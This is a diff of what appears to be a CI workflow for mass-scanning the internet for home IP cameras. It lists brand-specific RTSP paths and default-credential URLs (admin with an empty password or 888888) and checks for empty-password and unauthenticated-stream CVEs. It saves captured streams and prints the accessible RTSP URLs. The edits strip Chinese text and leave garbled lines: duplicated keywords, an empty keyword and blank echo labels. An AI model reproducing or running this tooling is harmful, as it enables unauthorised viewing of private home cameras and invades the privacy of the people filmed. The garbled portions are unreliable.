@@ -66,9 +66,9 @@ jobs:
             -json -o all_http.jsonl 2>/dev/null || true
           python3 -c "
           import json
-          kw=['hikvision','hik','ezviz','萤石','dahua','大华','imou','乐橙','tapo','tp-link',
-              'xiaomi','mijia','小米','reolink','uniview','宇视','xmeye','雄迈','camera','cam',
-              'ipc','dvr','nvr','live view','监控','摄像','cctv','onvif','rtsp']
+          kw=['hikvision','hik','ezviz','ezviz','dahua','dahua','imou','','tapo','tp-link',
+              'xiaomi','mijia','xiaomi','reolink','uniview','uniview','xmeye','xmeye','camera','cam',
+              'ipc','dvr','nvr','live view','ipcam','camera','cctv','onvif','rtsp']
           hits=[]
           try:
             for line in open('all_http.jsonl'):
@@ -98,16 +98,15 @@ jobs:
           )
 
           var brandPaths = []string{
-            // 海康/萤石
+            // hikvision/ezviz
             "/h264/ch1/main/av_stream",
             "/h264/ch1/sub/av_stream",
             "/ISAPI/Streaming/channels/101",
             "/ISAPI/Streaming/channels/102",
-            // 大华/乐橙 Imou
             "/cam/realmonitor?channel=1&subtype=0",
             "/cam/realmonitor?channel=1&subtype=1",
             "/cam/realmonitor?channel=2&subtype=0",
-            // 小米/米家
+            // xiaomi/mijia
             "/live", "/live/ch00_0",
             "/stream", "/video",
             // Reolink
@@ -116,12 +115,12 @@ jobs:
             "/h265Preview_01_main",
             // TP-Link Tapo
             "/stream1", "/stream2", "/stream0",
-            // XMEye/雄迈
+            // XMEye/xmeye
             "/user=admin&password=&channel=1&stream=0.sdp",
             "/user=admin&password=888888&channel=1&stream=0.sdp",
-            // ONVIF 通用
+            // ONVIF generic
             "/onvif1", "/onvif2", "/onvif/media",
-            // 通用
+            // generic
             "/0", "/1", "/2",
             "/live.sdp", "/mpeg4", "/mpeg4/1/main/av_stream",
             "/MediaInput/h264", "/ch01.264",
@@ -337,7 +336,7 @@ jobs:
               enc := json.NewEncoder(outf)
               for h := range hitCh {
                 enc.Encode(h)
-                fmt.Printf("[TCP %s] %s:%s → %s\n", h.CVE, h.IP, h.Port, h.Desc)
+                fmt.Printf("[TCP %s] %s:%s  %s\n", h.CVE, h.IP, h.Port, h.Desc)
                 count++
               }
             }()
@@ -524,13 +523,11 @@ jobs:
               r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2023-45361", Desc: "Reolink empty-pass login"})
             }
 
-            // 小米/米家 CVE-2019-11219 telnet 硬编码（HTTP 特征识别）
             code, body = get(base+"/cgi-bin/global.cgi?action=get_info", nil)
             if code == 200 && (bytes.Contains(body, []byte("xiaomi")) || bytes.Contains(body, []byte("mijia")) || bytes.Contains(body, []byte("miui"))) {
               r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2019-11219", Desc: "Xiaomi cam identified - check telnet:23 root/(empty)"})
             }
 
-            // 小米摄像头 API 无认证检测
             for _, mp := range []string{"/api/v1/stream/video", "/stream/live", "/cgi-bin/snapshot"} {
               code, body = get(base+mp, nil)
               if code == 200 && len(body) > 100 {
@@ -615,7 +612,7 @@ jobs:
                   count++
                   cves := []string{}
                   for _, v := range r.Vulns { c := v.CVE; if c == "" { c = v.Type }; cves = append(cves, c) }
-                  fmt.Printf("[VULN] %s → %v\n", r.Base, cves)
+                  fmt.Printf("[VULN] %s  %v\n", r.Base, cves)
                   mu.Unlock()
                 }
               }(t)
@@ -661,7 +658,7 @@ jobs:
               ], capture_output=True, timeout=12)
 
               if os.path.exists(out) and os.path.getsize(out) > 1000:
-                  print(f"[OK] {ip}:{port} → {os.path.getsize(out)//1024}KB")
+                  print(f"[OK] {ip}:{port}  {os.path.getsize(out)//1024}KB")
                   ok += 1
               else:
                   if os.path.exists(out): os.remove(out)
@@ -703,20 +700,20 @@ jobs:
           cat cam-shard-*/http_vulns.jsonl 2>/dev/null  > merged/http_vulns_all.jsonl
           cat cam-shard-*/tcp_vulns.jsonl 2>/dev/null   > merged/tcp_vulns_all.jsonl
 
-          echo "===== 家用摄像头扫描汇总 ====="
-          echo "开放端口:     $(wc -l < merged/open_ports_all.txt)"
-          echo "可访问RTSP:   $(wc -l < merged/rtsp_hits_all.jsonl)"
-          echo "HTTP漏洞:     $(wc -l < merged/http_vulns_all.jsonl)"
-          echo "TCP DVR漏洞:  $(wc -l < merged/tcp_vulns_all.jsonl)"
+          echo "===== camera ====="
+          echo ":     $(wc -l < merged/open_ports_all.txt)"
+          echo "RTSP:   $(wc -l < merged/rtsp_hits_all.jsonl)"
+          echo "HTTP:     $(wc -l < merged/http_vulns_all.jsonl)"
+          echo "TCP DVR:  $(wc -l < merged/tcp_vulns_all.jsonl)"
           echo ""
-          echo "=== 可访问 RTSP 流 ==="
+          echo "===  RTSP  ==="
           python3 -c "
           import json
           for line in open('merged/rtsp_hits_all.jsonl'):
             r=json.loads(line); print(r.get('rtsp_url',''))
           " 2>/dev/null | head -100
           echo ""
-          echo "=== CVE 分布 ==="
+          echo "=== CVE  ==="
           python3 -c "
           import json
           from collections import Counter
